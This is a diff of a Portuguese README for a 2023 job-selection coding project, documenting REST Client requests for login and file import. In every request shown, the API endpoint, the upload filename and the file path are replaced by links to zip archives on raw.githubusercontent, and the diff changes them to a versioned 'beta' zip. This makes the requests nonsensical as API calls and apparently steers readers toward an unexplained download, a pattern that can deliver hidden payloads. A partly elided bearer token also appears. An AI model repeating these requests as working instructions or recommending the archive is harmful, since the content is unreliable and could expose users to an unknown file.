@@ -8,7 +8,7 @@ Feito isso o arquivo gerado é .fbd. Em Seguida os dados de cada tabela será ex
 Através de um código abaixo é feita a conexão com a API utilizando o plug-in  REST CLIENT instalado no VS-CODE
 
 ### rota de login com o usário
-POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/psel-shinier-2023.zip HTTP/1.1
+POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip HTTP/1.1
 content-type: application/json
 
 
@@ -20,17 +20,17 @@ content-type: application/json
 
 
 ### rota de carregar o import retorna a diferença entre o esperado e o enviado
-POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/psel-shinier-2023.zip HTTP/1.1
+POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip HTTP/1.1
 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
 Authorization: Bearer ey… token gerado no login …jjsy8iGl8wFu7MGrhaV6l8
 
 
 ------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="file"; filename="https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/psel-shinier-2023.zip"
+Content-Disposition: form-data; name="file"; filename="https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip"
 Content-Type: application/excel
 
 
-< https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/psel-shinier-2023.zip
+< https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip
 ------WebKitFormBoundary7MA4YWxkTrZu0gW
 Content-Disposition: form-data; name="type"
 
